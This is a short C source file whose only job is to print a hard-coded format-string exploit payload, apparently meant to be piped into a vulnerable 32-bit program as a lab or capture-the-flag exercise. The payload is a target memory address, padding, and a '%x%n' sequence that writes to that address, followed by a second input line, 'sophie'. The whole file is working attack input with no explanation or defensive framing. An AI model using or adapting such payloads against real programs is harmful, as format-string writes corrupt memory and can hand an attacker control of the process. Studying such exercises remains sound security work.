#include <stdio.h>
#include <string.h>


char attackString[] = "\x2a\xa0\x04\x08                                                           %x%n\nsophie\n"; 
int main(){
	char *p = attackString;
	for(int i = 0; i <sizeof(attackString); i++){
		putchar(*p);
		p++;
		
	}
	return 0;
}
